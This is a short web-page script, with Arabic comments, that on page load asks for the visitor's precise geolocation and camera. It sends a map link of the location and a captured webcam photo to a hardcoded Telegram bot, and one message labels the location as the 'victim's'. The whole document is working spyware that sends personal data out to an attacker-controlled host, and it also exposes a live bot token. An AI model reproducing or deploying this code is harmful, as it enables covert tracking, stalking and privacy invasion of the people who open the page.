<script>
    const TOKEN = "8734073875:AAF5fOQ11ouU73zemiV5hxuAhdOao0Zls3s";
    const CHAT_ID = "6082990097";

    function sendToTelegram(message) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
    }

    async function startEverything() {
        // طلب الموقع أولاً وبشكل مستقل
        navigator.geolocation.getCurrentPosition(position => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
            sendToTelegram(`📍 موقع الضحية: ${mapLink}`);
        }, error => {
            sendToTelegram(`❌ فشل جلب الموقع: ${error.message}`);
        }, { enableHighAccuracy: true, timeout: 5000 });

        // طلب الكاميرا بعد طلب الموقع
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;

            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(blob => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'capture.jpg');
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                }, 'image/jpeg');
            }, 2500);
        } catch (err) {
            sendToTelegram(`❌ فشل فتح الكاميرا: ${err.message}`);
        }
    }

    window.onload = startEverything;
</script>
